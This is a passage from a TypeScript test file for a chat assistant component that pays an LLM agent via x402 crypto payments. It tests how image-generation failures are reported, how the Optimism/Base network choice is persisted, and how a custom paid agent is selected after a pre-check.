      expect(imageCall).not.toContain("eip155:11155420"); // OP Sepolia
      expect(imageCall?.every((n) => ["eip155:10", "eip155:8453"].includes(n))).toBe(true);
    });

    it("reports why a generation failed instead of swallowing the error", async () => {
      // The first version classified the error to a one-word status and dropped it: no console
      // output, and the model was told only "generation_failed", so the user got "I'm having
      // trouble generating the image" with no way for anyone to find out why.
      const consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "a cat", size: "1024x1024" }))
        .mockResolvedValueOnce(textResponse("Sorry, that did not work."));
      mockGenerateImage.mockRejectedValue(new Error("Request failed: 402 - insufficient allowance"));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw a cat");

      await screen.findByDisplayValue("a cat");
      fireEvent.click(screen.getByRole("button", { name: /assistent\.toolConfirmGenerate/ }));

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));

      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const toolResult = secondConvo.find((m) => m.role === "tool");
      const parsed = JSON.parse(toolResult!.content) as { status: string; reason?: string };
      expect(parsed.status).toBe("generation_failed");
      expect(parsed.reason).toContain("insufficient allowance");
      expect(consoleError).toHaveBeenCalled();

      consoleError.mockRestore();
    });

    it("truncates a very long failure reason before sending it to the model", async () => {
      // Tool results are billed as input tokens on every later hop, and wallet/SDK errors are
      // routinely multi-line and enormous.
      const consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "a cat", size: "1024x1024" }))
        .mockResolvedValueOnce(textResponse("Sorry."));
      mockGenerateImage.mockRejectedValue(new Error("x".repeat(500)));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw a cat");

      await screen.findByDisplayValue("a cat");
      fireEvent.click(screen.getByRole("button", { name: /assistent\.toolConfirmGenerate/ }));

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));

      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const parsed = JSON.parse(secondConvo.find((m) => m.role === "tool")!.content) as { reason?: string };
      expect(parsed.reason!.length).toBeLessThanOrEqual(201); // 200 chars + the ellipsis

      consoleError.mockRestore();
    });

    it("disables the send button and input while the confirm card is open", async () => {
      mockSendMessage.mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "x", size: "1024x1024" }));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw x");

      await screen.findByDisplayValue("x");
      expect(screen.getByPlaceholderText("assistent.placeholder")).toBeDisabled();
    });
  });

  /**
   * The network picker. A channel is per (network, receiver) and each one escrows $0.50, so
   * "the choice sticks" is the assertion that actually protects the user's money — without
   * it they'd silently open a second channel on the other chain.
   */
  describe("network picker", () => {
    beforeEach(() => window.localStorage.clear());

    it("defaults to Optimism and pays on it", () => {
      renderWithQuery(<AssistantChat />);

      expect(useX402Chat).toHaveBeenCalledWith("eip155:10", "https://llm-agent.fretchen.eu");
    });

    it("persists the chosen network and pays on it", async () => {
      renderWithQuery(<AssistantChat />);

      fireEvent.click(screen.getByRole("button", { name: "Base" }));

      await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:8453", "https://llm-agent.fretchen.eu"));
      expect(window.localStorage.getItem("x402-chat-network")).toBe("eip155:8453");
    });

    it("restores a stored choice on the next visit", async () => {
      window.localStorage.setItem("x402-chat-network", "eip155:8453");

      renderWithQuery(<AssistantChat />);

      await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:8453", "https://llm-agent.fretchen.eu"));
    });

    it("ignores a stored network the site no longer supports", async () => {
      window.localStorage.setItem("x402-chat-network", "eip155:84532");

      renderWithQuery(<AssistantChat />);

      await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:10", "https://llm-agent.fretchen.eu"));
    });

    it("explains itself when the agent forced a different network than the one chosen", () => {
      // Chose Optimism (the default) but the hook negotiated down to Base — the user is
      // paying on a chain they didn't pick, so the UI has to say so.
      vi.mocked(useX402Chat).mockReturnValue({
        sendMessage: mockSendMessage,
        status: "idle",
        error: null,
        paymentReceipt: null,
        reset: vi.fn(),
        isReady: true,
        paymentNetwork: "eip155:8453",
      });

      renderWithQuery(<AssistantChat />);

      // The note names the chain with a ChainBadge rather than bare text, so the string is
      // split across elements — assert the label and the badge separately.
      const note = screen.getByText(/assistent\.networkFallback/);
      expect(note).toBeInTheDocument();
      expect(within(note).getByTitle("Base")).toBeInTheDocument();
    });
  });

  /**
   * The custom-agent escape hatch. It is also the only ready-made batch-settlement client,
   * so builders following /agent-onboarding use it to pay their own agent end-to-end —
   * which makes "the pasted URL is what actually gets paid" the load-bearing assertion here.
   */
  describe("custom agent selection", () => {
    const CUSTOM_URL = "https://another-agent.example";
    const CUSTOM_CARD = {
      origin: CUSTOM_URL,
      title: "Another agent",
      operator: "Someone Else",
      contactUrl: null,
      payTo: "0xabcdef0123456789abcdef0123456789abcdef01",
      network: "eip155:8453",
    };

    function pasteAndTry(url: string) {
      fireEvent.change(screen.getByPlaceholderText("https://another-agent.example"), { target: { value: url } });
      fireEvent.click(screen.getByRole("button", { name: "Use this agent" }));
    }

    it("renders the selector and pays the default agent until one is chosen", () => {
      renderWithQuery(<AssistantChat />);

      expect(screen.getByPlaceholderText("https://another-agent.example")).toBeInTheDocument();
      expect(useX402Chat).toHaveBeenCalledWith("eip155:10", "https://llm-agent.fretchen.eu");
    });

    it("pre-checks a pasted URL and then pays that agent instead", async () => {
      vi.mocked(precheckLlmV1Agent).mockResolvedValue({ ok: true, card: CUSTOM_CARD });

      renderWithQuery(<AssistantChat />);
      pasteAndTry(CUSTOM_URL);

      await waitFor(() => expect(precheckLlmV1Agent).toHaveBeenCalledWith(CUSTOM_URL));
      await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:10", CUSTOM_URL));
      // Provenance of who is about to be paid.
      expect(screen.getByText("Someone Else")).toBeInTheDocument();
    });

    it("shows the reason and keeps the default agent when the pre-check fails", async () => {
      vi.mocked(precheckLlmV1Agent).mockResolvedValue({
        ok: false,
        reason: "Expected a 402 payment challenge, got 200.",
      });

      renderWithQuery(<AssistantChat />);
      pasteAndTry("https://not-an-agent.example");

      expect(await screen.findByText(/Expected a 402 payment challenge/)).toBeInTheDocument();
      expect(useX402Chat).not.toHaveBeenCalledWith(expect.anything(), "https://not-an-agent.example");
    });

    it("returns to the default agent", async () => {
      vi.mocked(precheckLlmV1Agent).mockResolvedValue({ ok: true, card: CUSTOM_CARD });

      renderWithQuery(<AssistantChat />);
      pasteAndTry(CUSTOM_URL);

      const back = await screen.findByRole("button", { name: "Back to default agent" });
      fireEvent.click(back);

      await waitFor(() => expect(useX402Chat).toHaveBeenLastCalledWith("eip155:10", "https://llm-agent.fretchen.eu"));
    });
  });
});
